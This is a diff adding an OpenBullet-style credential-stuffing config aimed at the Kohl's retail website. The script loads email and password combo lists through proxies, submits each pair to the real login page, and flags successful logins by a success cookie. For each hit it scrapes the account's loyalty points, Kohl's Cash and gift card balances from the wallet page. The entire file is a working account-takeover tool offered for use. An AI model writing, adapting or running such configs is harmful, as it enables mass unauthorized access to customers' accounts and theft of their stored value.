@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "Kohls",
+  "SuggestedBots": 20,
+  "LastModified": "2018-12-14T02:21:39.0246369+01:00",
+  "AdditionalInfo": "",
+  "Author": "FreakShock",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": true,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+BROWSERACTION Open "" 
+NAVIGATE "https://www.kohls.com/myaccount/kohls_login.jsp" 60 
+#USER ELEMENTACTION XPath "//*[@id=\"kiosk_loginEmail\"]" 
+  SendKeys "<USER>" -> VAR "" 
+#PASS ELEMENTACTION XPath "//*[@id=\"kiosk_loginPassword\"]" 
+  SendKeys "<PASS>" -> VAR "" 
+#SUBMIT ELEMENTACTION XPath "//*[@id=\"Profilelogin\"]" 
+  Click "" -> VAR "" 
+ELEMENTACTION XPath "//*[@id=\"Profilelogin\"]" 
+  Click "" -> VAR "" 
+ELEMENTACTION XPath "//*[@id=\"Profilelogin\"]" 
+  Click "" -> VAR "" 
+#FAIL KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "password you entered has an error" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "setLoginSuccessCookie" 
+NAVIGATE "https://www.kohls.com/wallet/my_wallet.jsp#gift-cards" 60 
+FUNCTION Delay "1000" -> VAR "" 
+#POINTS ELEMENTACTION XPath "//*[@id=\"walletLoyalityUser\"]/div[4]/ul[1]/li[2]/a/span[2]" 
+  GetText "" -> CAP "Points" 
+#Kohls_Cash ELEMENTACTION XPath "//*[@id=\"walletLoyalityUser\"]/div[4]/ul[1]/li[3]/a/span[2]" 
+  GetText "" -> CAP "Kohls Cash" 
+#GC ELEMENTACTION XPath "//*[@id=\"walletLoyalityUser\"]/div[4]/ul[1]/li[4]/a/span[2]" 
+  GetText "" -> CAP "GC" 
